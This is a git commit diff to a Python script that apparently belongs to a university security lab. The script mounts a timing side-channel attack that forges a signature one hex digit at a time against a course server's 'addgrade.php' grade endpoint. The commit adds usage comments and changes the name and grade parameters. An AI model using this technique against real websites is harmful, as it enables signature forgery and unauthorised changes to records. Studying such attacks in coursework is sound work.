3b560f630827e2e988fbf359b2428465ce1b7382
PetterBerntsson <iprovedtheriemannhypothesis@gmail.com>
2019-12-15 16:44:51 +0100

    added useful comments

--- WebAttack/Slowling.py
+++ WebAttack/Slowling.py
@@ -1,19 +1,19 @@
 #!/usr/bin/env python3
 
 # Program for exploiting slow signature verification in websites
+# WARNING: This does not always produce correct answers, please verify by the final output that body response = b\n1
+# USEFUL: Performance seems to be affected by your current internet usage. Might be better to close down all internet
+# activity while running (Seems to produce correct output more often while not using other services)
 
 import requests
 import time
-import logging
 
-# Couldn't supress 'requests' output, try somethig different
-logging.getLogger("requests").setLevel(logging.FATAL)
 
 host = 'https://eitn41.eit.lth.se'
 port = '3119'
 resource = '/ha4/addgrade.php?'
-name = 'Kalle'
-grade = '5'
+name = 'Pelle'
+grade = '3'
 signature = ''
 
 signature_length = 20
@@ -31,6 +31,7 @@ response_time = 0
 for i in range(signature_length):
 
     sig_val = 0
+
     for i in range(base):
 
         sig_val = hex(i)[2:]
@@ -43,12 +44,15 @@ for i in range(signature_length):
 
         response_times_index.append([response_time - request_time, i])
 
-    current_max = 0
+    current_max = 0.0
     max_index = 0
     for item in response_times_index:
         if current_max < item[0]:
             current_max = item[0]
             max_index = item[1]
+
+    # Clear or not, the slowest signature will be added anyway, so this should not affect the program
+    response_times_index.clear()
 
     signature = signature + str(hex(max_index)[2:][:1])
 
